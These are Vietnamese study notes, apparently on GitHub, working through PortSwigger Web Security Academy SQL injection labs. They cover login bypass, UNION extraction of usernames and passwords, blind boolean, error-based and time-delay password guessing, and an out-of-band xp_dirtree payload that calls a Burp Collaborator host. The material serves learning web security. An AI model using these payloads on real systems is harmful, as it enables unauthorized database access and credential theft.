Đây rồi :|| cái mà tôi mong chờ nhất :||
# SQL Injection là gì
- SQL Injection (SQLi) là một lỗ hổng bảo mật web cho phép atker can thiệp vào truy vấn mà app thực hiện trong dtb. Điều này có thể cho phép atker xem dữ liệu mà bình thường không thể truy cập. Có thể là những data thuộc về user khác, hay những data khác mà app có thể truy cập. Trong nhiều trường hợp, một atker có thể sửa hay xoá data này, làm thay đỏi nội dung/hành vi của app
- Trong một vài tình huống, một atker có thể thực hiện SQL Injection atk vào một server cơ bản, hay các cơ sở hạ tầng back-end. Nó cũng có thể cho phép atker thực hiện tấn công denial-of-service (DOS) - tấn công từ chối dịch vụ

# Làm sao để phát hiện một lỗ hổng SQL Injection
- Bạn có thể phát hiện SQLi thủ công bằng cách sư dụng một test đầu vào của app. Để làm điều này, bạn có thể thử gửi:
  - Một kí tự trích dẫn ```'``` và check lỗi hay sự bất thường nào khác
  - Một số cú pháp SQL cụ thể đánh giá giá trị đầu vào, thử nhập các giá trị rồi đánh giá sự khác nhau giữa các response
  - Điều kiện logic để bypass như ```or 1=1``` hay ```or 1=2```, và kiểm tra sự khác nhau tỏng response
  - Payloads được thiết kế để kích hoạt time delay khi thực thi bên trong một truy vấn SQL, và tìm điểm khác biệt trong response time 
  - OAST payloads được thiết kế để kích hoạt một tương tác mạng ngoài băng tần (out-of-band) khi thực thi truy vấn SQL, và theo dỗi các tương tác phát sinh
- Mặt khác, bạn có thể tìm đa số SQL Injection vuln nhanh gọn lẹ nhờ Burp Scanner :||

# Truy xuất dữ liệu ẩn (Retrieving hidden data)
- Tưởng tượng một app shopping hiển thị sản phẩm ở các danh mục khác nhau. Khi user click vào một danh mục vd nhưu ```Quà tặng```, Browser sẽ request URL:

      https://insecure-website.com/products?category=Gifts
- Điều này khiến app tạo một truy vấn SQL để lấy thông tin sản phẩm từ dtb
  
      SELECT * FROM products WHERE category = 'Gifts' AND released = 1
- Truy vấn SQL này yêu cầu dtb trả về
  - Tất cả thông tin ```*```
  - Từ bảng ```product```
  - ```Category``` là ```gifts```
  - ```released``` là ```1```
- ```released = 1``` là để ẩn sản phẩm mà chưa được release. Ta có thể check các sản phẩm chưa released bằng cách thay bằng 0

# Truy xuất dữ liệu ẩn - Tiếp
- Một app khi không có một biện pháp bảo vệ khỏi SQLi. Thì có nghĩa là atker có thể thực hiện atk, ví dụ:

      https://insecure-website.com/products?category=Gifts'--
- Truy vấn SQL lúc đấy sẽ là

      SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
  - Hãy để ý răng ```--``` là một dấu để viết cmt ở sau nó, đồng nghĩa với việc truy vấn trên sẽ bị bay mất phần ```AND``` ở sau và sẽ trả về mọi sản phẩm cả ẩn và không ẩn
- Ta có thể sử dụng kĩ thuật tương tự để khiến app hiển thị mọi thứ :|| Ví dụ để hiện các danh mục bị ẩn

      https://insecure-website.com/products?category=Gifts'+OR+1=1--
- Khi đó truy vấn sẽ là

      SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
  - Vẫn là bỏ phần ```AND```ở sau nhưng thêm một cái ```OR 1=1```. Khi đấy truy vấn sẽ xét 1 trong 2 điều kiện đúng và 1=1 thì luôn đúng nên coi như truy vấn này sẽ in ra mọi sản phẩm ở mọi category<br>
> [!NOTE]
> Hãy cẩn thận khi inject một điều kiện kiểu ```or 1=1``` vào một truy vấn sql. Ngay cả khi trông nó có vẻ vô hại trong lúc ta inject vào, nhưng việc app sử dụng dữ liệu từ một request đơn trong nhiều truy vấn khác nhau là điều bình thường. Nếu điều kiện vô tình lọt vào cách lệnh ```UPDATE``` hay ```DELETE``` thì đúng là đờ i đi
## Lab văn l
- Vuln: khi user chọn một category, app sẽ thực hiện truy vấn

      SELECT * FROM products WHERE category = 'Gifts' AND released = 1
- Nhiệm vụ là thực hiện SQLi atk :||
- Chọn một Category bất kì, giả sử là ```Pets``` đi, URL của nó trông như này

      https://0a5b00c60413732787321a06004d00e9.web-security-academy.net/filter?category=Pets
- Sửa lại URL để lừa truy vấn :||

      https://0a5b00c60413732787321a06004d00e9.web-security-academy.net/filter?category=Pets'+or+1=1--
- Xong

# Phá vỡ logic app (Subverting App Logic)
- Tưởng tượng một app cho user login với một username và pass. Nếu một user submit username là ```wiener``` và pass là ```bluecheese```, app sẽ kiểm tra thông tin xác thực bằng cách thực hiện truy vấn SQL như sau:

      SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'
- Nếu truy vấn này trả về thông tin chi tiết của một user, sau đó login success :||. Không thì là thất bại
- Trong trường hợp này, một atker có thể login như một user bất kì mà không cần pass. Họ có thể chơi mấy cái kiểu nhưu ```--``` để bỏ điều kiện where. Ví dụ, submit username là ```admin'``` và để trống pass sẽ có truy vấn như này

      SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
- Truy vấn trả về user có ```username``` là ```admin``` và login successful
## Lab nóng nảy
- Chứa lỗ hổng SQLi trong login function
- Nhiệm vụ là thực thi SQLi atk để login vào admin
- Vào giao diện login, để username là ```administrator```

# UNION ATK 
- Union là một câu lệnh trong sql được dùng để gộp 2 bảng, và kết quả của truy vấn được trả về trong response của app, bạn có thể sử dụng UNION để lấy data từ bảng khác trong dtb.
- UNION cho phép bạn thực thi một hay nhiều truy vấn SELECT và thêm kết quả vào truy vấn gốc. Ví dụ:

      SELECT a, b FROM table1 UNION SELECT c, d FROM table2
- Truy vấn SQL trả về một kết quả đơn với 2 cột, gầm giá trị từ cột a và b trong bảng 1, cột c và d trong bảng 2
- Để UNION hoạt động hiệu quả, cần chú ý 2 yêu cầu sau
  - Truy vấn đơn phải trả về cùng số cột
  - Kiểu dữ liệu trong mỗi cột phải thích với truy vấn đơn kia
- Để tiến hành một cuộc atk SQLi UNION, hãy đảm bảo răng đợt atk này thoả mãn 2 yêu cầu sau:
  - Có bao nhiêu cột được trả về từ truy vấn gốc
  - Kiểu dữ liệu được trả về như thế nào, có phù hợp với truy vấn được UNION không
 
# Xác định số cột
- Phần này nhằm phục vụ cho UNION atk
- Khi bạn thực hiện UNION atk, sẽ có 2 giải pháp để xác điịnh xem có bao nhiêu cột được trả về từ truy vấn gốc
## Phương pháp 1
- Một phương phấp liên quna đến việc thêm một series ORDER BY và tăng dần giá trị cột nhất động cho đến khi xuất hiện lỗi (tức là đến khi lỗi là hết cột, đếm các cái chưa lỗi là sẽ thu được số cột). Ví dụ, một injection point là một chuỗi trích dẫn trong WHERE của truy vấn gốc. Ta có thể điền như sau

      ' ORDER BY 1--
      ' ORDER BY 2--
      ' ORDER BY 3--
      etc.
- Series payloads này điều chỉnh truy vấn gốc để sắp xếp kết quả theo các cột khác nhau. Cột trong một mệnh đề ORDER BY có thể được chỉ định bằng các mục của nó, vậy nên bạn không cần phải biết tên cột. Khi chỉ mục của cột được chỉ định vượt quá số cột hiện cố, nó sẽ báo lỗi như sau

      The ORDER BY position number 3 is out of range of the number of items in the select list.
- App có lẽ sẽ trả về dtb error trong HTTP response, nhưng nó cũng có thể đưa ra error response chung trong trường hợp khác, nó có thể đơn giản không trả về bất cứ thứ gì. Mặt khác, miễn là bạn còn thấy sự khác nhau giữa các response, thì vẫn có thể xác định được số cột được trả về, bạn có thể suy được số cột từ truy vấn
## Phương pháp 2
- Phương pháp thứ2 liên quan đến việc gửi một series UNI SELECT payload với một lượng giá trị ```NULL``` khác nhau

      ' UNION SELECT NULL--
      ' UNION SELECT NULL,NULL--
      ' UNION SELECT NULL,NULL,NULL--
      etc.
- Nếu số lượng NULL không băng với số cột trong bảng thì sẽ trả về lỗi

      All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.
- Ta sử dụng ```NULL``` như giá trị trả về từ truy vấn ```SELECT``` bởi kiểu dữ liệu trong mỗi cột phải phù hợp giữa bảng gốc và truy vấn được thêm vào, ```NULL``` thì có thể phù hợp với bất cứ kiểu dữ liệu nào, nên nó mở ra khả năng payload sẽ thành công
- Như với kĩ thuật dùng ```ORDER BY```, app có thể thực sự trả về dtb error trong HTTP response, nhưng cũng có thể trả về một lỗi chung hay đơn giản không trả về gì cả.
- Khi số ```NULL``` bằng với số cột, dtb sẽ trả về hợp của bảng đấy, gồm cả NULL ở mỗi cột. HTTP Response sẽ phụ thuộc vào code của app. Nếu bạn may mắn, bạn sẽ thấy được nội dung truy vấn trong response, như một dòng phụ trên một bảng HTML. Mặt khác, giá trị NULL có thể kích hoạt một lỗi khác, như là ```NullPointerException```. Trong trường hopwj xấu nhất, response có thể trông giống như một response bởi số NULL sai. Điều này khiến phuong pháp này mất đi hiệu quả
### Lab lập loè
- Mục tiêu của lab này là sử dụng UNION atk để check số cột
- Ok lab này khá dễ :|| ít nhất là tôi thấy thế
- Bật intercept, chọn một category bất kì
- Để ý phần ```category=...```, Đoạn này nếu ở trong truy vấn thì sẽ là ở đoạn ```WHERE category='...'```
- Ta hay tham số của category là ```'+UNION+SELECT+NULL--``` rồi tăng dần số NULL lên là được ![image](https://github.com/Myozz/Web_Applications/assets/94811005/61a52a8c-7b26-49b3-8ab5-32ee0c20f22d)

## Cú pháp dành riêng DTB (Database-specific Syntax)
- Trên Oracle, mọi truy vấn ```select``` phải sử dụng ```from``` và chỉ định một bảng. Có một bảng dựng sẵn trên Oracle được gọi là ```dual``` có thể sử dụng trong tình huống này. Vậy nên truy vấn thêm vào trên Oracle sẽ trông như này:

      ' UNION SELECT NULL FROM DUAL--
- Oracle vẫn dùng ```--``` để comment hoá đoạn sau
- Trên MySQL, ```--``` phải kèm thêm một dấu cách
- Ở một phía khác, kí tự ```#``` cũng có thể sử dụng để xác định một cmt
- Xem thêm thông tin tại [Cheat Sheet này](https://portswigger.net/web-security/sql-injection/cheat-sheet)

# Tìm cột với kiểu dữ liệu
- Một SQLi UNION atk cho phép bạn chôm kết quả từ truy vấn. Những dữ liệu thú vị mà bạn muốn chôm thường ở dạng string. Có nghĩa bạn cần tìm một hay nhiều cột ở truy vấn gốc có kiểu dữ liệu hoặc tương thích với kiểu string
- Sau khi xác định được số cột, bạn có thể thăm dò từng cột một để test xem nó có thể chứa dữ liệu kiểu string hay không. Bạn có thể gửi một series ```UNION SELECT``` payloads để nhét string vào từng cột chia ra làm nhiều lần. Ví dụ, nếu truy vấn trả về 4 cột, ta có thể submit như sau:

      ' UNION SELECT 'a',NULL,NULL,NULL--
      ' UNION SELECT NULL,'a',NULL,NULL--
      ' UNION SELECT NULL,NULL,'a',NULL--
      ' UNION SELECT NULL,NULL,NULL,'a'--
- Nếu kiểu dữ liệu của cột không tương thích với kiểu string, truy vấn được thêm vào sẽ gây ra lỗi, kiểu: ```Conversion failed when converting the varchar value 'a' to data type int.```
- Nếu một lỗi không xảy ra, và response của app chứa một số nội dung gồm giá trị string được thêm vào, thì :|| lúc đấy nó cũng trả về dữ liệu của cột
## Lab
- Lab này chứa SQli vuln trong category filter. Kết quả trả về trong response, nên bạn có thể dùng UNION atk để chôm dữ liệu :||
- Vẫn làm như lab trước đó ![image](https://github.com/Myozz/Web_Applications/assets/94811005/14489c02-0151-4096-8105-1046adf55b00)
- Quăng sang repeater test cho mượt
- Đầu tiên phải xác định có bao nhiêu cột bằng cách thay tham số trong category thành như sau: ```'+UNION+SELECT+NULL--``` (hình nhưu thế) rồi tăng dần số NULL lên rồi so sánh response, ta xác định được có 3 cột
- Thay lại tham số thành như sau: ```'+UNION+SELECT+NULL,'misEGY',NULL--```, nếu lỗi thì chuyển 'misEGY' sang cái NULL khác cho đến khi ra kết quẩ thôi ![image](https://github.com/Myozz/Web_Applications/assets/94811005/6c484244-dccf-48d5-8035-c78cfee87265)

# Sử dụng một SQLi UNION atk để lấy dữ liệu
- Khi bạn xác định được nố cột của truy vấn gốc và tìm ra được cột nào có chứa string, từ đó xác định đâu có thể sẽ chứa thông tin mà bạn cần
- Giả sử rằng
  - Truy vấn gốc trả về 2 cột, cả hai đều chứa string
  - Điểm injection là một chuỗi trích dẫn bên trong ```WHERE```
  - CSDL goomf 1 bảng ```users``` với 2 cột ```username``` và ```password```
- Trong ví dụ này, ta có thể lấy nội dung của bảng ```users``` bằng cách gửi input sau

      ` union select username, password from users--
- Để thực hiện tấn cống, bạn càn biết có một bảng ```users``` với 2 cột như trên. Nếu không có thông tin này, bạn có thể đoán tên bảng hay cột. Tất cả hệ thống thống dtb ngày nay đều cung cấp cách để kiểm tra cấu trúc dtb, và xấc định bảng nào và cột nào có trong dtb
## Lab lòng lợn
- Lab này chứa SQLi vuln trong category filter. Kết quả từ truy vấn được trả về trong app's responsse, cho nên bạn có thể sử dụng union atk để thu thấp dữ liệu từ các bảng khác.
- Dtb gồm một bảng khác là ```users``` với 2 cột ```username``` và ```password```
- Để giải lab này, thực hiện SQLi Union ATK để thu thập tất cả usrname và pass và sử dụng thông tin thu được để login vào admin
- Trông lú văn phết nhỉ :|| check thử có bao nhiều cột ![image](https://github.com/Myozz/Web_Applications/assets/94811005/921245a1-a28b-420f-93c6-1d515afbc457)
- Xác định được có 2 cột thì thử thay null thành string để xem 2 cột này có phải string không (chắc chắn là có r :)) )
- Giờ sửa request thành một truy vấn username và pass từ bảng users, kết quả sẽ cho ra khác tài khoản trong hệ thống ![image](https://github.com/Myozz/Web_Applications/assets/94811005/0875ebf1-77bc-42db-a1c6-774008d5e0b0)
- Giờ thì lấy tài khoản admin rồi login thôi :|| ez

# Lấy nhiều nhiều giá trị trong một cột đơn
- Trong một số trường hợp truy vấn ở ví dụ trước có thể chỉ trả về một cột đơn
- Bạn có thể lấy nhiều giá trị cùng nhau bên trong một cột đơn bằng cách nối các giá trị với nhau. Bạn có thể thêm một dấu phân cách để giúp bạn phân biệt cách dữ liệu trong cột. Ví dụ, trên Oracle bạn có thể gửi input sau

      ' UNION SELECT username || '~' || password FROM users
  (trong truy vấn trên thì ```||``` có tác dụng nối dữ liệu từ 2 hay nhiều cột thành một, string ở giữa có mục đích để phân cách)
- Kết quả trả về trông sẽ như này ![image](https://github.com/Myozz/Web_Applications/assets/94811005/27e763d0-24fd-4355-a390-9fd90ba6f489)
- Mỗi lang SQL lại có một cú pháp nối cột khác nhau, có thể tham khảo tại [cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
## Lab lếu lều
- Lab này chứa SQLi vuln trong category filter
- DTB có bảng users với 2 cột usrname và pass
- Thực hiện SQLi UNION atk để lấy toàn bộ thông tin usrname và pass rồi sử dụng để login vào admin
- Lab này tương tự lab trước :|| khác mỗi cái là chỉ có một cột mang kiểu string ![image](https://github.com/Myozz/Web_Applications/assets/94811005/b1cfd800-e4e3-4792-8010-202432d24bfa)
- Sửa lại câu lệnh truy vấn thành ```'+union+select+null,username||':'||password+from+users--``` để lấy ghép cột username với password :|| thế là chôm được admin acc ![image](https://github.com/Myozz/Web_Applications/assets/94811005/fa496117-fc5a-411b-a3a0-6e8c29d2d219)

# Kiểm tra dtb trong SQLi atk
- Để khai thác SQLi vuln thì việc tìm kiếm thông tin về dtb là khá cần thiết. Việc này bao gồm
  - Loại + phiên bản dtb của mục tiêu
  - Các bảng+cột của dtb mục tiêu
 
# Truy vấn loại và phiên bản éc quy eo
- Ta có thể xác định cả loại và phiên bản của dtb bằng cách thêm vào một vài cái truy vấn va vẩn
- Dưới đây là một vài truy vấn để xác định phiên bản dtb cho một số loại dtb phổ biến ![image](https://github.com/Myozz/Web_Applications/assets/94811005/5157231b-0915-4225-9a6b-903e4a8a4ce3)
- Ví dụ, ta sử dụng UNION atk với input là

      ' UNION SELECT @@version--
- Nó sẽ trả về thông tin phiên bản của dtb
## Lab lấy lười lê luôn vào lưng con lợn, lấy bộ lòng luộc lên
- Lab này dính phải một SQLi uln trong category filter. Có thể sử dụng UNION atk để lấy kết quả của truy vấn được thêm vào
- Cái lab này dễ vcl nên không viết gì nhiều :)) dm :)) nó dùng comment bằng dấu ```#``` chứ đ phải ```--```, bảo sao mãi đ được :)) cay vc (cái comment # là của MySQL) ![image](https://github.com/Myozz/Web_Applications/assets/94811005/a40409a7-726d-4393-9ca6-5404311635ce)
- Sau lab này tôi nhận ra mình cần phải check từng loại éc quy eo một :))

# Liệt kê nội dung dtb
- Hầu hết các loại dtb (trừ Oracle) có một loại view gọi là lược đồ thông tin (infomation schema). Nó cung cấp thông tin và dtb
- Ví dụ, bạn có thể truy vấn ```infomation_schema.tables``` để liệt kê các bảng trong dtb (nghe ngon vc, thế mà không hiểu sao phải học mấy cái trên :)) )

      SELECT * FROM infomation_schema.tables
  - Nó sẽ trả về output như sau ![image](https://github.com/Myozz/Web_Applications/assets/94811005/4e1a1a71-2476-4113-b415-73c515429c34)
- Output cho ta thấy được có 3 bảng ```products```, ```users``` và ```feedback```
- Ta có thể thực hiện một truy vấn lược đồ tương tự với các cột trong bản đã được xác định như sao

      SELECT * FROM infomation_schema.columns WHERE table_name = users
  - Lệnh truy vấn vừa rồi sẽ cho ra thông tin về các cột của bảng ```users``` (hình như Microsoft SQL cũng có một câu lệnh nhưng xịn hơn, cho phép xem cấu trúc bảng :)) là ```SP_HELP```, nhưng có lẽ sẽ không được sử dụng vì nó là thủ tục nên không thể tận dụng được SQLi)
## Lab lông lá
- Lab này chứa SQLi vuln như mấy lab kia
- Mục tiêu lấy login vào administrator
- Let's start :((
  - Check bảng ![image](https://github.com/Myozz/Web_Applications/assets/94811005/d0bb28c6-a409-4379-9d84-f7eb4cfa885f)
  - Check cột ![image](https://github.com/Myozz/Web_Applications/assets/94811005/9a9eab82-b01d-4336-882f-6319819a12fd)
  - Truy vấn username và pass của bảng vừa tìm được ![image](https://github.com/Myozz/Web_Applications/assets/94811005/108cb90d-66be-4c93-8453-1ce36b8fcd48)

# Blind SQLi 
- Blind SQLi xảy ra khi một app có chữa SQLi vuln, nhưng HTTP responsse của nó không chứa kết quả của truy vấn SQL hay chi tiết của lỗi dtb
- Nhiều kĩ thuật như UNION không hiệu quả với blind SQLi vuln. Đó là vì chúng dựa trên việc xem kết quá của truy vấn được thêm vào response mà blind SQL không chứa truy vấn để lợi dụng. Đương nhiên vẫn có thể khai thác blind SQLi vuln để truy cập vào dữ liệu mà không cần uỷ quyền nhưng sẽ dùng kĩ thuật khác
## Khai thác blind SQLi bằng cách kích hoạt respose có điều kiện
- Xem xét một app sử dụng tracking cookies để thu thập dữ liệu phân tích. Request tới app gồm một cookie header như này

      Cookie: TrackingID=u5YD3PapBcR4lN3e7Tj4
- Khi một request chứa ```TrackingID``` cookie được tiến hành, app sử dụng một truy vấn SQL để xác định người dùng

      SELECT TrackingID FROM TrackedUsers WHERE TrackingID = 'u5YD3PapBcR4lN3e7Tj4'
- Truy vấn trên có lỗ hổng, nhưng kết quả của nó không được trả về user. Tuy nhiên, app sẽ có những hanh vi khác nhau phụ thuộc vào truy vấn trả về dữ liệu như nào. Nếu bạn gửi một ```TrackingID``` được công nhân, truy vấn trả về dữ liệu và bạn nhận được một tin nhắn "Welcome Back" của response
- Hành vi là đủ để có thể khai thác blind SQLi vuln. Bạn có thể thu thập thông tin bằng cách kích hoạt response, phụ thuộc vào điều kiện được inject
- Để hiểu cách hoạt động của nó, hãy giả định rằng có 2 requests được gửi có chứa ```TrackingID`` cookie

      …xyz' AND '1'='1
      …xyz' AND '1'='2
  - Cái đầu tiên sẽ trả về kết quả bởi điều kiện được inject ```AND '1'='1'``` luôn đúng. Vậy nên kết quả 'Welcome Back' sẽ được hiện thị
  - Cái thứ hai thì rõ ràng là không trả về cái gì rồi :)) lí do như trên
- Điều này cho phép ta xác định câu trả lời từ bất kì diều kiện đơn được inject nào, và trích xuất dữ liệu từng phân một
- Ví dụ, giả sử có một bảng ```Users``` với cột ```Username``` và ```Password```, và một user được gọi là ```Administrator```. Bạn có thể xác định pass của admin bằng cách gửi một loạt input để test pass
- Để thực hiện, ta dùng input dưới đây

      xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username='Administrator'), 1, 1) > 'm
  - Nếu nó trả về 'Welcome Back' thì tức là điều kiện đúng (kí tự đầu tiên của pass là một chữ sau ```m```) và ngược lại. Từ đấy ta có thể thu hẹp dần và xác định pass :O (tôi đang thắc mắc nếu pass chứa kí tự đặc biệt thì sao :||)
> [!NOTE]
> Hàm ```SUBSTRING``` là hàm lấy string con từ string được thêm vào (theo như google thì nó sẽ không đếm dấu cách khi xác định vị trí kí tự. Một số dtb khác thì nó có thể là ```SUBSTR```
## Lab ăn lông ở lỗ
- Lab này chứa Blind SQLi Vlun. App sử dụng một tracking cookie để phân tích dữ liệu, và thực hiện một truy vấn SQL chứa giá trị của cookie được gửi tới
- Kết quả của truy vấn không được trả về, cũng như k có error message được hiển thị. Nhưng app chứa thông báo 'Welcome Back' nếu truy vấn trả về bất cứ hàng dữ liệu nào
- DTB gồm một bảng ```users``` với cột ```username``` và ```pâssword```. Bạn cần khai thác Blind SQLi vuln để tìm ra pass của ```administrator``` user

# Blind SQLi with conditional errors
- :|| Vô tình bị xoá nhưng cái này không khác SQL là mấy ở, đều là check đúng sai
- Khác ở chỗ thay vì dựa trên message trả về để xác định đúng sai thì ở đây sẽ dùng lỗi :|| (không lỗi hoặc lỗi
## Lab lòng lợn
- Như trên :|| sử dụng lỗi để xử lý lab lòng lợn này
- Vào cheat sheet tại [đây](https://portswigger.net/web-security/sql-injection/cheat-sheet) hay bất cứ đâu khác :)) kiếm phần conditional error để mà check ![image](https://github.com/Myozz/Web_Applications/assets/94811005/5ab2c841-28d5-4f04-8b86-98b7cc18ebe7)
- :|| Ta có thể thử từng cái trong cheatsheet để đoán được ver dtb của mục tiêu.
  - ![image](https://github.com/Myozz/Web_Applications/assets/94811005/17c05689-9a80-4cce-9ce0-afd0ada12244) Vừa chôm thử ở Oracle nên ta xác định được mục tiêu dùng Oracle, và tôi cũng thử 2 điều kiện và kết quả rất ok :))
  - Giờ chỉ cần sửa lại một chút để check độ dài của pass admin (mộn như làng) ![image](https://github.com/Myozz/Web_Applications/assets/94811005/068e26ee-f5c2-42a4-9aec-1ca4bc78233b)
Chuyển sang Intruder và test từng số một thôi
  - Xác định được pass của admin có 20 kí tự
  - Quay lại repeater để chính lại code nhằm dò pass :)) ![image](https://github.com/Myozz/Web_Applications/assets/94811005/f346ffcb-9874-4630-a57f-38f823aa8c63)
  - Chuyển lại sang Intruder dùng mode Cluster Bomb để có thể chơi 2 payload ![image](https://github.com/Myozz/Web_Applications/assets/94811005/f417fffa-16e7-4ea9-9312-8a29cbfdd555)
  - Start attack và ta sẽ thu được pass

# Chôm dữ liệu nhảy cảm thông qua error mess của SQL
- Sự ngu dốt khi config dtb đối khi sẽ để lại hậu quả là error mess dài vcl. Nó có thể cung cấp thông tin có thể hữu ích cho atker. Ví dụ, xét thử error mess dưới đây, có thể xảy ra khi thêm một dấu ```'``` vào tham số ```id```

      Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char
- À ừm :|| như đã thấy thì nó trả về cm cái truy vấn luôn, rất ngu tôi biết :)) với sự ngu dốt này thì ta cứ thể lợi dùng nó để atk :))
- Như vậy, ta hoàn toàn có thể khiến app trả về error mess mà có chưuas một chút dữ liệu của truy vấn. Nó khiến blind SQLi trở thành Lee seen :)) hay visible SQLi
- Bạn có thể sử dụng hàm ```cast()``` (hàm chuyển kiểu dữ liệu). Ví dụ về hàm này, tưởng tượng có một truy vấn như sau:

      CAST((SELECT example_column FROM example_table) AS int)
- Thường thì, dữ liệu ta cần là string. Ví dụ ở trên giúp ta chuyển về dạng int, và điều này có thể khiến xảy ra lỗi

       ERROR: invalid input syntax for type integer: "Example data"
- Và đấy :)) ta đã chôm được thông tin cần chôm
## Lab lo li
- Lab này có một SQLi vuln. App sử dụng tracking cookie để phân tích dữ liệu và thực hiện truy vấn SQL. Kết quả của truy vấn sẽ không được trả về
- Nhiệm vụ của ta vẫn là lấy pass admin nhưng phải lợi dụng verbose error mess vừa được học
- khó phết chứ đùa :((
  - Xem qua cheat sheet cái đã nào ![image](https://github.com/Myozz/Web_Applications/assets/94811005/abcece16-6200-42c7-8b44-019e0f4ada33)
  - Lấy thử câu lệnh của MsSQL đi, tống vào repeater và nó sẽ trả về như này ![image](https://github.com/Myozz/Web_Applications/assets/94811005/2ee3b40b-22d0-465f-95b6-72a351e9fb67) . Có vẻ như nó không thể đọc được hết câu lệnh, nên ta bắt buộc phải tìm cách thu ngắn nó lại.
  - ![image](https://github.com/Myozz/Web_Applications/assets/94811005/281f5646-59f1-45ec-89f7-dcb7f6f0380d)
Sau khi chỉnh lại code cho nó đúng cũng như ngắn gọn hơn để có thể test thì lỗi trả về sẽ như này, lỗi này là do ta không có phép so sánh nào ở đoạn code (vì đoạn code đang nằm ở where nên phải có biểu thức logic)
  - Thêm ```1=``` vào trước code, ta đã truy cập thành công. Tuy nhiên đây mới chỉ là bước test :|| mục tiêu của ta là lấy pass của admin ![image](https://github.com/Myozz/Web_Applications/assets/94811005/9634d8bc-e5ce-442a-82f0-627bd876e1fc)
  - Nghĩ nào, code không cho phép ta viết quá dài. Liệu có cách nào để ta viết code đầy đủ mà không bị dính cái này không :||. Đúng rồi đấy :)) xoá cm cái ```TrackingID``` đi
  - ![image](https://github.com/Myozz/Web_Applications/assets/94811005/e53f03d3-9ef4-4eca-b4b5-cc2794df3503)
Sửa lại code và ta thu lại được một lỗi rằng có quá nhiều hàng được trả về, ta chỉ có thể trả về một hàng thôi
  - ![image](https://github.com/Myozz/Web_Applications/assets/94811005/ee2e4fbf-9bbb-4656-8789-c75806b9ba19)
hm.... lỗi này mở ra một con đường mới :|| mục tiêu đã lộ diện. Lỗi nãy xảy ra do ta thay đổi dạng string sang int
  - ![image](https://github.com/Myozz/Web_Applications/assets/94811005/ee373021-bf1f-4338-b1e1-91d9e13f5116)
Làm một cấu truy vấn tương tự với password :)) và ta thu được password

# Khái thác blind SQLi bằng cách kích hoạt time delay
- Nếu app gặp phải lỗi dtb khi truy vấn SQL được thực thi và xử lý, sẽ không có bất kì điểm khác biệt nào ở response. Nó có nghĩa là các kĩ thuật trước là vô dụng
- Trong trường hợp này, việc ta có thể làm là kích hoạt time delay để xác định xem giá trị trả về là đúng hay sai. Vì truy vấn SQL thường xử lý đồng bộ với nhau bởi app, độ trễ trong thực thi truy vấn SQL cũng sẽ delay HTTP response. ĐIều này cho phép ta xác định điều kiện thêm
- Kĩ thuật kích hoạt time delay dành riếng cho loại dtb được sử dụng. Ví dụ, trên Ms SQL Serverr, bạn có thể sử dụng một điều kiện để test delay

      '; IF (1=2) WAITFOR DELAY '0:0:10'--
      '; IF (1=1) WAITFOR DELAY '0:0:10'--
- Nhìn là đủ hiểu, nếu điều kiện sai/đúng thì sẽ có time delay như kia
- Sử dugj kĩ thuật này, chúng ta có thể thu thập dữ liệu bằng cách kiểm tra mỗi kí tự một lằn

      '; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
## Lab lầy lội
- Rõ ràng là vẫn như các lab trên, nhưng lần này ta sẽ sử dụng time delay để lấy pass của admin
- Check qua cheat sheet, thử từng cái để xác định phiên bản SQL
- Lab như lìn :(( sai hay đúng thì nó đều trả về như nhau thành ra khó nhận biết quá

      '%3b select+case+when+(1=1)+then+pg_sleep(10)+else+pg_sleep(0)+end--
- Sau khi test lòi lìn thì ta sẽ bắt đầu kiểm tra độ dài pass (chắc vẫn là 20 thôi) ![image](https://github.com/Myozz/Web_Applications/assets/94811005/bcd7f087-223c-455e-90f5-b20f5db3a3f2)
![image](https://github.com/Myozz/Web_Applications/assets/94811005/707a69ec-9eb3-4987-8f48-bf46bdecff61)
- Giờ thì đến giải đoạn mò pass

# Khai thác Blind SQLi sử dụng kĩ thuật out-of-band (OAST) 
- Một app có thể tiến hành truy vấn giống nhau như ví dụ trước nhưng chúng lại không đồng bộ. App tiếp tục tiến trình được request trong luồng gốc, và sử dụng luồng để thực thi một truy vấn SQL sử dụng tracking cookie (hiểu chung là truy vấn sql với chạy tiến trình bị tách biệt với nhau). Truy vấn vẫn có lỗ hổng SQLi, nhưng không kĩ thuật nào trước có thể sử dụng
- Trong trường hợp này, ta có thể khai thác Blind SQLi bằng cách kích hoạt tương tác mạng out-of-band tới hệ thống bạn điều khiển. Nó có thể được kích hoạt trên một điều kiện được thêm vào để chôm từng thông tin một. Hữu dụng hơn, dữ liệu có thể được lọc ra trong quá trình tương tác mạng
- Một loạt các giao thức mạng đa dạng có thể sử dụng cho mục đích này, nhưng thường thì DNS sẽ hiểu quả nhất. Nhiều sản phẩm mạng cho phép truy vấn DNS tự do, bởi chúng cần thiết cho hoạt động thông thường của hệ thống phân phối
- Công cụ dễ nhất và ngon nhất để thực hiện kĩ thuật out-of-band là Burp Collaborator. Đây là một server cung cấp các triển khai dịch vụ mạng khác nhau. Cho phép bạn nhận biết được khi nào tương tác mạng xảy ra như là một kết quả của việc gửi payload đơn lẻ tới vuln app. Burp Suite Pro có một built-in client được config để làm việc với Burp Collaborator ngay lập tức. Thông tin thêmowr [đây](https://portswigger.net/burp/documentation/desktop/tools/collaborator)
- Kĩ thuật kích hoạt truy vấn DNS dành riếng cho kiểu dtb này. Ví dụ, input dưới đây trên Ms SQL Serverr có thể được sử dụng để thực hiện một DNS lookup trên một domain xác định

      '; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--
- Nó có thể khiến dtb thực hiện một lookup cho domain ```0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net```
- Bạn có thể sử dụng Burp Collab để chôm vài cái subdomain ngon nghẻ và thăm dò Collab server để xác định khi có bất kì DNS lookup nào xảy ra
## Lab liếm láp
- Lab này vẫn là chứa Blind SQLi
